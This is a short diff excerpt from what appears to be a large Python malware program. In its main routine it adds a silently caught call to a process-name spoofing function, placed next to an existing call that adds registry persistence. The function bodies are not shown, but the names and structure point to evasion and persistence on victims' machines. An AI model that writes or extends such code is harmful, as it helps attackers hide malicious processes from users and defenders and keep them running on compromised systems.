@@ -6849,6 +6849,11 @@ def main():
         pass
     
     try:
+        _spoof_process_name()
+    except:
+        pass
+    
+    try:
         _add_registry_persistence()
     except:
         pass
